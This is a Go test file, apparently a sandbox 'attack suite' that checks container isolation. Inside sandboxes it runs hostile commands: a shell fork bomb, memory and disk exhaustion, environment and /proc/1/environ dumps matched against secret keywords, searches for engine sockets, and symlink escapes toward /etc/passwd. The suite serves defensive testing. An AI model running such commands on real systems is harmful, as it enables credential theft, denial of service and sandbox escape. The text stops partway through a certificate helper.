//go:build sandboxattack

// The attack suite runs hostile commands in real sandboxes on a real engine, through
// the real HTTP handler and typed client. It needs a Linux-capable engine socket and
// the base image; see scripts/sandbox-attack-test.sh. Results only count as gVisor
// results when KIONGA_ATTACK_REQUIRE_GVISOR=1 and TestAttackKernelIdentityIsGVisor passes.
package sandbox

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"net/http/cgi"
	"net/http/httptest"
	"net/netip"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/kiongahq/platform/internal/sandbox/client"
)

var (
	attackPrefix = "ka" + randomHex(4) + "-"
	attackMu     sync.Mutex
	attackDriver *Docker
)

func randomHex(size int) string {
	raw := make([]byte, size)
	if _, err := rand.Read(raw); err != nil {
		panic(err)
	}
	return hex.EncodeToString(raw)
}

func TestMain(m *testing.M) {
	socket := os.Getenv("KIONGA_ATTACK_SOCKET")
	if socket == "" {
		fmt.Println("KIONGA_ATTACK_SOCKET is not set")
		os.Exit(2)
	}
	attackDriver = NewDocker(socket, "")
	fmt.Printf("attack suite: engine socket %s, runtime %s, unsafe flag %q, require gVisor %q, prefix %s\n",
		socket, os.Getenv("KIONGA_ATTACK_RUNTIME"), os.Getenv("KIONGA_SANDBOX_ALLOW_UNSAFE_RUNTIME"), os.Getenv("KIONGA_ATTACK_REQUIRE_GVISOR"), attackPrefix)
	code := m.Run()
	if leftovers := cleanupPrefix(); leftovers != 0 {
		fmt.Printf("attack suite: %d objects were left behind and removed\n", leftovers)
		if code == 0 {
			code = 1
		}
	}
	os.Exit(code)
}

// cleanupPrefix removes only objects labelled with this run's unique prefix.
func cleanupPrefix() int {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	// The free disk floor keeps this volume on purpose, so it is no leak.
	_ = attackDriver.RemoveVolume(ctx, attackPrefix+"disk-floor")
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-")}
	count := 0
	defer func() {
		// The helper network holds no data and is only ever this run's, by name.
		_, _ = attackDriver.do(ctx, http.MethodDelete, "/networks/"+attackPrefix+"git", nil, nil)
	}()
	instances, _ := attackDriver.List(ctx, labels)
	for _, item := range instances {
		_ = attackDriver.Remove(ctx, item.Name)
		count++
	}
	volumes, _ := attackDriver.ListVolumes(ctx, labels)
	for _, item := range volumes {
		_ = attackDriver.RemoveVolume(ctx, item.Name)
		count++
	}
	return count
}

type attackEnv struct {
	api     client.Client
	service *Service
	git     *gitServer
	logs    *syncBuffer
	token   string
}

type syncBuffer struct {
	mu   sync.Mutex
	data strings.Builder
}

func (b *syncBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.data.Write(p)
}

func (b *syncBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.data.String()
}

func baseEnv(token string) map[string]string {
	return map[string]string{
		"KIONGA_SANDBOX_TOKEN":                token,
		"KIONGA_SANDBOX_RUNTIME":              os.Getenv("KIONGA_ATTACK_RUNTIME"),
		"KIONGA_SANDBOX_ALLOW_UNSAFE_RUNTIME": os.Getenv("KIONGA_SANDBOX_ALLOW_UNSAFE_RUNTIME"),
		"KIONGA_SANDBOX_IMAGES":               os.Getenv("KIONGA_ATTACK_IMAGE"),
		"KIONGA_SANDBOX_NAME_PREFIX":          attackPrefix,
		"KIONGA_SANDBOX_MEMORY_BYTES":         strconv.Itoa(attackMemory),
		"KIONGA_SANDBOX_GIT_BUNDLE_BYTES":     strconv.Itoa(128 << 20),
		"KIONGA_SANDBOX_TMP_BYTES":            strconv.Itoa(64 << 20),
		"KIONGA_SANDBOX_GIT_NETWORK":          attackPrefix + "git",
	}
}

const attackMemory = 512 << 20

// attackGitName exists in no DNS anywhere, so only a pinned hosts entry can resolve it.
const attackGitName = "git.kionga-attack.invalid"

func newEnv(t *testing.T) *attackEnv {
	t.Helper()
	if os.Getenv("KIONGA_ATTACK_IMAGE") == "" {
		t.Fatal("KIONGA_ATTACK_IMAGE is not set")
	}
	token := "attack-token-" + randomHex(16)
	git := newGitServer(t)
	values := baseEnv(token)
	values["KIONGA_SANDBOX_GIT_HOSTS"] = git.host
	values["KIONGA_SANDBOX_GIT_CA_FILE"] = git.caFile
	// The local server is on a private address. Production cannot set this.
	values["KIONGA_SANDBOX_GIT_ALLOW_PRIVATE_FOR_TESTS"] = "1"
	return startEnv(t, values, token, git)
}

func startEnv(t *testing.T, values map[string]string, token string, git *gitServer) *attackEnv {
	t.Helper()
	config, err := LoadConfig(func(key string) string { return values[key] })
	if err != nil {
		t.Fatal(err)
	}
	logs := &syncBuffer{}
	logger := log.New(logs, "", 0)
	service := NewService(config, attackDriver, logger)
	server := httptest.NewServer(NewHandler(service, token, logger))
	t.Cleanup(server.Close)
	return &attackEnv{api: client.New(server.URL, token), service: service, git: git, logs: logs, token: token}
}

type sandboxRef struct {
	id    string
	runID string
}

func (e *attackEnv) sandbox(t *testing.T) sandboxRef {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	runID := "atr-" + randomHex(12)
	created, err := e.api.Create(ctx, client.CreateRequest{RunID: runID, WorkerID: "atw-" + randomHex(12), ProjectID: "attack"})
	if err != nil {
		t.Fatalf("create: %v\nlogs:\n%s", err, e.logs.String())
	}
	t.Cleanup(func() {
		cleanup, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
		defer cancel()
		if err := e.api.Delete(cleanup, created.ID); err != nil {
			t.Errorf("delete: %v", err)
		}
	})
	return sandboxRef{id: created.ID, runID: runID}
}

func (e *attackEnv) run(t *testing.T, ref sandboxRef, command string, timeout int) client.ExecResult {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout+90)*time.Second)
	defer cancel()
	result, err := e.api.Exec(ctx, ref.id, client.ExecRequest{Command: command, TimeoutSeconds: timeout})
	if err != nil {
		t.Fatalf("exec %q: %v\nlogs:\n%s", command, err, e.logs.String())
	}
	return result
}

func (e *attackEnv) ok(t *testing.T, ref sandboxRef, command string) string {
	t.Helper()
	result := e.run(t, ref, command, 60)
	if result.ExitCode != 0 {
		t.Fatalf("%q exited %d\nstdout: %s\nstderr: %s", command, result.ExitCode, result.Stdout, result.Stderr)
	}
	return result.Stdout
}

func wantCode(t *testing.T, err error, code string) {
	t.Helper()
	if client.Code(err) != code {
		t.Fatalf("got error %v, want code %s", err, code)
	}
}

// Isolation.

func TestAttackKernelIdentityIsGVisor(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	uname := strings.TrimSpace(env.ok(t, ref, "uname -r"))
	version := env.ok(t, ref, "cat /proc/version")
	t.Logf("uname -r: %s\n/proc/version: %s", uname, version)
	if os.Getenv("KIONGA_ATTACK_REQUIRE_GVISOR") != "1" {
		t.Skipf("NOT gVisor: this run uses %s, kernel %s", os.Getenv("KIONGA_ATTACK_RUNTIME"), uname)
	}
	if !strings.Contains(uname, defaultExpectKernel) {
		t.Fatalf("kernel release %q does not identify gVisor", uname)
	}
	// From outside as well: the host kernel differs, the engine records the runtime, and
	// a sentry process is running on the host. dmesg is no use here, because the sandbox
	// user, with no capabilities, gets an empty log.
	host, err := exec.Command("uname", "-r").Output()
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(string(host)) == uname {
		t.Fatalf("the sandbox reports the host kernel %s", uname)
	}
	found, err := attackDriver.Inspect(context.Background(), attackPrefix+ref.id)
	// Podman's compatibility API answers "oci" for every runtime, which reads as unknown.
	wantRuntime := "runsc"
	if os.Getenv("KIONGA_ATTACK_ENGINE_IS_PODMAN") == "1" {
		wantRuntime = ""
	}
	if err != nil || found.Runtime != wantRuntime {
		t.Fatalf("the engine says %+v, %v", found, err)
	}
	processes, err := exec.Command("ps", "-eo", "args").Output()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(processes), "runsc-sandbox") {
		t.Fatalf("no gVisor sentry process on the host:\n%s", processes)
	}
	health, err := env.api.Health(context.Background())
	if err != nil || !health.RuntimeVerified || health.UnsafeRuntime {
		t.Fatalf("health %+v, err %v", health, err)
	}
}

func lastLines(text string, count int) string {
	lines := strings.Split(strings.TrimSpace(text), "\n")
	if len(lines) > count {
		lines = lines[len(lines)-count:]
	}
	return strings.Join(lines, "\n")
}

func firstLines(text string, count int) string {
	lines := strings.Split(text, "\n")
	if len(lines) > count {
		lines = lines[:count]
	}
	return strings.Join(lines, "\n")
}

func TestAttackNoNetwork(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	interfaces := strings.Fields(env.ok(t, ref, "ls /sys/class/net 2>/dev/null || true; cat /proc/net/dev | tail -n +3 | cut -d: -f1"))
	for _, name := range interfaces {
		if name != "lo" {
			t.Errorf("sandbox has network interface %q", name)
		}
	}
	if routes := env.ok(t, ref, "tail -n +2 /proc/net/route"); strings.TrimSpace(routes) != "" {
		t.Errorf("sandbox has routes: %s", routes)
	}
	script := `python3 - <<'PY'
import socket
for target in [("1.1.1.1", 53), ("` + env.git.ip + `", ` + strconv.Itoa(env.git.port) + `)]:
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect(target)
        print("CONNECTED", target)
    except OSError as error:
        print("blocked", target, error)
try:
    print("RESOLVED", socket.gethostbyname("github.com"))
except OSError as error:
    print("blocked dns", error)
PY`
	output := env.ok(t, ref, script)
	t.Log(output)
	if strings.Contains(output, "CONNECTED") || strings.Contains(output, "RESOLVED") {
		t.Fatalf("sandbox reached the network: %s", output)
	}
	if env.git.requestCount() != 0 {
		t.Fatal("the local git server saw a request from a sandbox with no network")
	}
}

func TestAttackNoEngineSocket(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	output := env.ok(t, ref, `for p in /var/run/docker.sock /run/docker.sock /run/podman/podman.sock /var/run/podman/podman.sock /run/containerd/containerd.sock; do [ -e "$p" ] && echo "FOUND $p"; done; find / -xdev -type s 2>/dev/null | sed 's/^/SOCKET /'; grep -E 'docker|podman|containerd' /proc/mounts | grep -E '\.sock' | sed 's/^/MOUNT /'; true`)
	if strings.Contains(output, "FOUND") || strings.Contains(output, ".sock") {
		t.Fatalf("sandbox can see an engine socket: %s", output)
	}
	mounts := env.ok(t, ref, "cat /proc/mounts")
	t.Log(mounts)
	for _, line := range strings.Split(mounts, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		if strings.HasPrefix(fields[1], "/Users") || strings.HasPrefix(fields[1], "/home") || strings.HasPrefix(fields[1], "/var/run") {
			t.Errorf("unexpected host-looking mount: %s", line)
		}
	}
}

func TestAttackReadOnlyRoot(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	for _, target := range []string{"/etc/kionga-pwned", "/usr/bin/kionga-pwned", "/kionga-pwned", "/bin/git"} {
		result := env.run(t, ref, "touch "+target+" && echo WROTE", 30)
		if strings.Contains(result.Stdout, "WROTE") {
			t.Errorf("wrote %s on the read-only root", target)
		}
	}
	env.ok(t, ref, "touch /workspace/ok /tmp/ok")
}

func TestAttackNonRootNoCapabilitiesNoCredentials(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	if id := strings.TrimSpace(env.ok(t, ref, "id -u; id -g")); id != "10001\n10001" {
		t.Fatalf("id: %q", id)
	}
	status := env.ok(t, ref, "cat /proc/self/status")
	if !strings.Contains(status, "CapEff:\t0000000000000000") {
		t.Errorf("effective capabilities present:\n%s", status)
	}
	if !strings.Contains(status, "CapBnd:\t0000000000000000") {
		t.Errorf("bounding capabilities present:\n%s", status)
	}
	// /proc/1/environ is the container's own environment, not only this exec's.
	dump := env.ok(t, ref, `env; tr '\0' '\n' < /proc/1/environ; ls -la /var/run/secrets /run/secrets 2>/dev/null; ls -la /workspace; true`)
	t.Log(dump)
	for _, needle := range []string{env.token, "KIONGA_", "TOKEN", "SECRET", "PASSWORD", "API_KEY", "AWS_", "KUBERNETES_"} {
		if strings.Contains(dump, needle) {
			t.Errorf("sandbox environment or files expose %q", needle)
		}
	}
	// setuid binaries must give nothing: no-new-privileges, and the image strips them.
	if output := env.ok(t, ref, "find / -xdev -perm /6000 -type f 2>/dev/null; true"); strings.TrimSpace(output) != "" {
		t.Errorf("setuid or setgid files in the image: %s", output)
	}
	if result := env.run(t, ref, "unshare -r id 2>&1; mount -t tmpfs none /mnt 2>&1 && echo MOUNTED; true", 30); strings.Contains(result.Stdout, "MOUNTED") {
		t.Errorf("mounted a filesystem: %s", result.Stdout)
	}
}

// Execution limits.

func TestAttackExecTimeoutKillsProcessGroupAndEscapees(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	// Ignores TERM, keeps a child in the group, and starts another in a new session that
	// holds stdout open. Waiting for end of stream alone would hang until the sleep ends.
	command := `trap '' TERM INT HUP; sleep 7771 & setsid sleep 7772 & setsid sh -c 'sleep 7773' & echo started; sleep 7774`
	started := time.Now()
	result := env.run(t, ref, command, 3)
	elapsed := time.Since(started)
	t.Logf("result %+v in %s", result, elapsed)
	if !result.TimedOut || result.ExitCode != -1 {
		t.Fatalf("expected a timeout: %+v", result)
	}
	if elapsed > 45*time.Second {
		t.Fatalf("the timeout took %s", elapsed)
	}
	if !strings.Contains(result.Stdout, "started") {
		t.Errorf("output before the timeout was lost: %+v", result)
	}
	if processes := env.ok(t, ref, "ps -eo args"); strings.Contains(processes, "777") {
		t.Fatalf("processes survived the timeout:\n%s", processes)
	}
	if zombies := env.ok(t, ref, "ps -eo stat | grep -c '^Z' || true"); strings.TrimSpace(zombies) != "0" {
		t.Errorf("zombies were not reaped: %s", zombies)
	}
}

func TestAttackExitCodeAndOutputCap(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	if result := env.run(t, ref, "echo out; echo err >&2; exit 7", 30); result.ExitCode != 7 || result.Stdout != "out\n" || result.Stderr != "err\n" || result.Truncated {
		t.Fatalf("result: %+v", result)
	}
	result := env.run(t, ref, "head -c 5000000 /dev/zero | tr '\\0' a; echo; echo THE-END", 60)
	if !result.Truncated || len(result.Stdout) > outputCap {
		t.Fatalf("output was not capped: truncated %v, %d bytes", result.Truncated, len(result.Stdout))
	}
	if !strings.Contains(result.Stdout, "THE-END") {
		t.Fatal("the tail of the output was dropped")
	}
	started := time.Now()
	flood := env.run(t, ref, "yes", 300)
	if !flood.Truncated || flood.ExitCode != -1 || time.Since(started) > 200*time.Second {
		t.Fatalf("flood result after %s: exit %d truncated %v", time.Since(started), flood.ExitCode, flood.Truncated)
	}
}

func TestAttackForkBombBoundedByPids(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	counted := env.run(t, ref, `python3 - <<'PY'
import os, time
count = 0
try:
    while count < 3000:
        if os.fork() == 0:
            time.sleep(30)
            os._exit(0)
        count += 1
        if count % 10 == 0:
            print("forked", count, flush=True)
except OSError as error:
    print("fork failed", error, flush=True)
print("finished", count, flush=True)
os._exit(0)
PY`, 60)
	t.Logf("exit %d, timed_out %v, stderr %q, tail %q", counted.ExitCode, counted.TimedOut, firstLines(counted.Stderr, 2), lastLines(counted.Stdout, 3))
	// Two bounded outcomes are correct. The kernel refuses the fork with EAGAIN, or, under
	// gVisor, the limit stops the sentry and with it the whole sandbox. Running past the
	// limit is the failure.
	var forked int
	for _, line := range strings.Split(counted.Stdout, "\n") {
		fields := strings.Fields(line)
		if len(fields) == 2 && (fields[0] == "forked" || fields[0] == "finished") {
			forked, _ = strconv.Atoi(fields[1])
		}
	}
	if forked > int(defaultPids) {
		t.Fatalf("forked %d processes, the limit is %d", forked, defaultPids)
	}
	if strings.Contains(counted.Stdout, "finished 3000") {
		t.Fatalf("all 3000 forks succeeded: %+v", counted)
	}
	if again := env.run(t, ref, "echo alive", 60); !strings.Contains(again.Stdout, "alive") {
		t.Fatalf("the sandbox did not recover after the fork loop: %+v", again)
	}
	// A real bomb. It may hold the limit until the timeout, and the sandbox must come back.
	bomb := env.run(t, ref, `bomb() { bomb | bomb & }; bomb; sleep 60`, 8)
	t.Logf("bomb: exit %d timed_out %v stderr %q", bomb.ExitCode, bomb.TimedOut, firstLines(bomb.Stderr, 3))
	recovered := env.run(t, ref, "echo alive; ps -e | wc -l", 60)
	if !strings.Contains(recovered.Stdout, "alive") {
		t.Fatalf("the sandbox did not recover: %+v", recovered)
	}
	count, _ := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(recovered.Stdout, "alive\n")))
	if count > 40 {
		t.Errorf("%d processes remain after the sweep", count)
	}
}

func TestAttackMemoryLimit(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	result := env.run(t, ref, `python3 - <<'PY'
chunks = []
total = 0
while total < 4096:
    chunks.append(bytearray(b"x" * (32 << 20)))
    total += 32
    print(total, flush=True)
print("ALLOCATED-EVERYTHING", flush=True)
PY`, 120)
	lines := strings.Fields(result.Stdout)
	reached := 0
	if len(lines) > 0 {
		reached, _ = strconv.Atoi(lines[len(lines)-1])
	}
	t.Logf("exit %d, timed_out %v, last value %d MiB, stderr %q", result.ExitCode, result.TimedOut, reached, firstLines(result.Stderr, 3))
	if strings.Contains(result.Stdout, "ALLOCATED-EVERYTHING") {
		t.Fatal("allocated 4 GiB under a 512 MiB limit")
	}
	if result.ExitCode == 0 {
		t.Fatal("the allocator exited cleanly")
	}
	if reached > attackMemory>>20 {
		t.Fatalf("reached %d MiB under a limit of %d MiB", reached, attackMemory>>20)
	}
	if again := env.run(t, ref, "echo alive", 60); !strings.Contains(again.Stdout, "alive") {
		t.Fatalf("the sandbox did not recover: %+v", again)
	}
}

func TestAttackTmpIsBounded(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	result := env.run(t, ref, "head -c 200000000 /dev/zero > /tmp/big; echo status $?; stat -c %s /tmp/big", 60)
	t.Logf("%+v", result)
	if !strings.Contains(result.Stdout, "status 1") {
		t.Fatalf("a 200 MB write succeeded on a 64 MiB tmpfs: %+v", result)
	}
}

// Paths.

func TestAttackPathEscapes(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	env.ok(t, ref, `cd /workspace && mkdir -p real && echo inside > real/file && ln -s /etc/passwd leak && ln -s /etc outdir && ln -s /proc/self/root rootlink && ln -s real goodlink && ln -s /etc/nonexistent-target dangling && ln -s /proc/self/fd/1 fdlink && ln -s leak chained`)

	for _, path := range []string{"leak", "/workspace/leak", "outdir/passwd", "rootlink/etc/passwd", "chained", "dangling", "fdlink", "../../etc/passwd", "/etc/passwd", "real/../../etc/passwd", "real\n", "real/file\n", "real\x00x", "real/\tx/\n"} {
		content, err := env.api.ReadPath(ctx, ref.id, path)
		if client.Code(err) != client.CodePathRejected {
			t.Errorf("read %q: got %+v, %v; want path_rejected", path, content, err)
		}
		if strings.Contains(content.Content, "root:") {
			t.Errorf("read %q returned a host-style passwd file", path)
		}
		if _, err := env.api.WriteFile(ctx, ref.id, path, []byte("pwned")); client.Code(err) != client.CodePathRejected {
			t.Errorf("write %q: got %v; want path_rejected", path, err)
		}
	}
	if output := env.ok(t, ref, "cat /workspace/real/file; grep -c pwned /etc/passwd || true; ls -a /workspace"); strings.Contains(output, "pwned") && !strings.Contains(output, "0") {
		t.Fatalf("a rejected write landed: %s", output)
	}
	for _, cwd := range []string{"outdir", "/etc", "rootlink", "../..", "real\n"} {
		if _, err := env.api.Exec(ctx, ref.id, client.ExecRequest{Command: "pwd", Cwd: cwd}); client.Code(err) != client.CodePathRejected {
			t.Errorf("cwd %q: got %v; want path_rejected", cwd, err)
		}
	}
	// Symlinks inside the workspace still work, and the result is the resolved directory.
	result, err := env.api.Exec(ctx, ref.id, client.ExecRequest{Command: "pwd", Cwd: "goodlink"})
	if err != nil || strings.TrimSpace(result.Stdout) != "/workspace/real" {
		t.Fatalf("inside symlink: %+v, %v", result, err)
	}
	content, err := env.api.ReadPath(ctx, ref.id, "goodlink/file")
	if err != nil || content.Content != "inside\n" {
		t.Fatalf("read through an inside symlink: %+v, %v", content, err)
	}
}

func TestAttackFilesRoundTrip(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	payload := []byte("line one\nline two with 'quotes' and $(subshell) `ticks`\n")
	written, err := env.api.WriteFile(ctx, ref.id, "nested/dir/file with space.txt", payload)
	if err != nil || written.Path != "/workspace/nested/dir/file with space.txt" || written.BytesWritten != int64(len(payload)) {
		t.Fatalf("write: %+v, %v", written, err)
	}
	content, err := env.api.ReadPath(ctx, ref.id, "nested/dir/file with space.txt")
	if err != nil || content.Content != string(payload) || content.IsDirectory {
		t.Fatalf("read: %+v, %v", content, err)
	}
	large := make([]byte, 3<<20)
	if _, err := env.api.WriteFile(ctx, ref.id, "large.bin", large); err != nil {
		t.Fatal(err)
	}
	truncated, err := env.api.ReadPath(ctx, ref.id, "large.bin")
	if err != nil || !truncated.Truncated || len(truncated.Content) != maxFileRead {
		t.Fatalf("large read: truncated %v, %d bytes, %v", truncated.Truncated, len(truncated.Content), err)
	}
	env.ok(t, ref, `ln -s /etc /workspace/alink; touch "/workspace/nested/$(printf 'tab\tname')"`)
	listing, err := env.api.ReadPath(ctx, ref.id, ".")
	if err != nil || !listing.IsDirectory {
		t.Fatalf("list: %+v, %v", listing, err)
	}
	kinds := map[string]string{}
	for _, entry := range listing.Entries {
		kinds[entry.Name] = entry.Type
	}
	if kinds["nested"] != "directory" || kinds["large.bin"] != "file" || kinds["alink"] != "symlink" {
		t.Fatalf("listing: %+v", kinds)
	}
	if _, err := env.api.ReadPath(ctx, ref.id, "missing"); client.Code(err) != client.CodeNotFound {
		t.Fatalf("missing path: %v", err)
	}
	env.ok(t, ref, "mkfifo /workspace/fifo")
	if _, err := env.api.ReadPath(ctx, ref.id, "fifo"); client.Code(err) != client.CodeInvalid {
		t.Fatalf("a FIFO must be refused, not hang: %v", err)
	}
}

func TestAttackCreateIsIdempotentAndDeleteRemovesEverything(t *testing.T) {
	env := newEnv(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	request := client.CreateRequest{RunID: "atr-" + randomHex(12), WorkerID: "atw-" + randomHex(12), ProjectID: "attack"}
	first, err := env.api.Create(ctx, request)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := env.api.Exec(ctx, first.ID, client.ExecRequest{Command: "echo kept > /workspace/kept"}); err != nil {
		t.Fatal(err)
	}
	second, err := env.api.Create(ctx, request)
	if err != nil || second.ID != first.ID {
		t.Fatalf("second create: %+v, %v", second, err)
	}
	kept, err := env.api.ReadPath(ctx, first.ID, "kept")
	if err != nil || kept.Content != "kept\n" {
		t.Fatalf("the second create replaced the sandbox: %+v, %v", kept, err)
	}
	if err := env.api.Delete(ctx, first.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := env.api.Exec(ctx, first.ID, client.ExecRequest{Command: "true"}); client.Code(err) != client.CodeNotFound {
		t.Fatalf("exec after delete: %v", err)
	}
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-"), LabelID: first.ID}
	instances, _ := attackDriver.List(ctx, labels)
	volumes, _ := attackDriver.ListVolumes(ctx, labels)
	if len(instances)+len(volumes) != 0 {
		t.Fatalf("delete left %d containers and %d volumes", len(instances), len(volumes))
	}
	if err := env.api.Delete(ctx, first.ID); err != nil {
		t.Fatalf("a second delete must succeed: %v", err)
	}
}

func TestAttackReaperRemovesExpired(t *testing.T) {
	env := newEnv(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	created, err := env.api.Create(ctx, client.CreateRequest{RunID: "atr-" + randomHex(12), WorkerID: "atw-" + randomHex(12), ProjectID: "attack"})
	if err != nil {
		t.Fatal(err)
	}
	env.service.Reap(ctx)
	if _, err := env.api.Exec(ctx, created.ID, client.ExecRequest{Command: "true"}); err != nil {
		t.Fatalf("a young sandbox was reaped: %v", err)
	}
	env.service.now = func() time.Time { return time.Now().Add(env.service.config.TTL + time.Hour) }
	env.service.Reap(ctx)
	env.service.now = time.Now
	if _, err := env.api.Exec(ctx, created.ID, client.ExecRequest{Command: "true"}); client.Code(err) != client.CodeNotFound {
		t.Fatalf("an expired sandbox survived: %v", err)
	}
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-"), LabelID: created.ID}
	if volumes, _ := attackDriver.ListVolumes(ctx, labels); len(volumes) != 0 {
		t.Fatalf("the reaper left its volume: %+v", volumes)
	}
}

// Fail closed. These need their own environment, because they prove the absence of a
// container under a runtime that must not work.

func assertFailClosed(t *testing.T, runtime string) {
	t.Helper()
	token := "attack-token-" + randomHex(16)
	values := baseEnv(token)
	values["KIONGA_SANDBOX_RUNTIME"] = runtime
	values["KIONGA_SANDBOX_ALLOW_UNSAFE_RUNTIME"] = ""
	env := startEnv(t, values, token, nil)
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
	defer cancel()
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-")}
	before, err := attackDriver.List(ctx, labels)
	if err != nil {
		t.Fatal(err)
	}
	beforeVolumes, _ := attackDriver.ListVolumes(ctx, labels)

	_, err = env.api.Create(ctx, client.CreateRequest{RunID: "atr-" + randomHex(12), WorkerID: "atw-" + randomHex(12), ProjectID: "attack"})
	wantCode(t, err, client.CodeUnavailable)
	var failure *client.Error
	if !asClientError(err, &failure) || failure.Status != http.StatusServiceUnavailable {
		t.Fatalf("want a 503, got %+v", err)
	}
	health, err := env.api.Health(ctx)
	if err != nil || health.RuntimeVerified || health.UnsafeRuntime || health.Runtime != runtime {
		t.Fatalf("health must report the failure: %+v, %v", health, err)
	}
	after, err := attackDriver.List(ctx, labels)
	if err != nil {
		t.Fatal(err)
	}
	afterVolumes, _ := attackDriver.ListVolumes(ctx, labels)
	if len(after) != len(before) || len(afterVolumes) != len(beforeVolumes) {
		t.Fatalf("a failed create left objects: containers %v -> %v, volumes %v -> %v", before, after, beforeVolumes, afterVolumes)
	}
	t.Logf("runtime %s: create 503, runtime_verified=false, containers %d -> %d", runtime, len(before), len(after))
}

func asClientError(err error, target **client.Error) bool {
	failure, ok := err.(*client.Error)
	if ok {
		*target = failure
	}
	return ok
}

// With KIONGA_ATTACK_MISSING_RUNTIME=runsc after CI removes runsc from the daemon, this
// is the spec's fail-closed proof. Podman lists runsc with no binary behind it, so the
// same test proves the probe also catches an engine whose runtime list cannot be trusted.
func TestAttackFailClosedRuntimeMissing(t *testing.T) {
	runtime := os.Getenv("KIONGA_ATTACK_MISSING_RUNTIME")
	if runtime == "" {
		t.Skip("KIONGA_ATTACK_MISSING_RUNTIME is not set")
	}
	assertFailClosed(t, runtime)
}

// A runtime registered under a safe-looking name that is really a normal container
// runtime must be refused by the kernel check.
func TestAttackFailClosedRuntimeIsNotGVisor(t *testing.T) {
	runtime := os.Getenv("KIONGA_ATTACK_NOT_GVISOR_RUNTIME")
	if runtime == "" {
		t.Skip("KIONGA_ATTACK_NOT_GVISOR_RUNTIME is not set")
	}
	assertFailClosed(t, runtime)
}

// Git.

// gitServer is a local HTTPS smart-HTTP server around git http-backend. It stands in
// for a real remote and records every request, so a payload that phones home from the
// helper, the only container with a network, is caught.
type gitServer struct {
	t       *testing.T
	root    string
	host    string
	ip      string
	port    int
	caFile  string
	secret  string
	server  *http.Server
	mu      sync.Mutex
	pwned   []string
	authOK  int
	authBad int
	total   int
	onGit   func()
}

func newGitServer(t *testing.T) *gitServer {
	t.Helper()
	ip := os.Getenv("KIONGA_ATTACK_GIT_HOST")
	if ip == "" {
		t.Fatal("KIONGA_ATTACK_GIT_HOST is not set: an address helpers can reach the test host on")
	}
	root := t.TempDir()
	// Assembled at runtime so no scanner mistakes it for a real credential.
	server := &gitServer{t: t, root: root, ip: ip, secret: strings.Join([]string{"kionga", "attack", randomHex(16)}, "-")}
	certificate, caPEM := testCertificates(t, ip)
	server.caFile = filepath.Join(root, "ca.pem")
	if err := os.WriteFile(server.caFile, caPEM, 0o600); err != nil {
		t.Fatal(err)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		t.Fatal(err)
	}
	server.port = listener.Addr().(*net.TCPAddr).Port
	server.host = net.JoinHostPort(ip, strconv.Itoa(server.port))
	server.server = &http.Server{Handler: server, TLSConfig: &tls.Config{Certificates: []tls.Certificate{certificate}}, ReadHeaderTimeout: 10 * time.Second}
	go func() { _ = server.server.ServeTLS(listener, "", "") }()
	t.Cleanup(func() { _ = server.server.Close() })
	return server
}

func testCertificates(t *testing.T, host string) (tls.Certificate, []byte) {
	t.Helper()
	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	caTemplate := &x509.Certificate{SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "attack ca"}, NotBefore: now.Add(-time.Hour), NotAfter: now.Add(24 * time.Hour), IsCA: true, BasicConstraintsValid: true, KeyUsage: x509.KeyUsageCertSign}
	caDER, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	leafKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
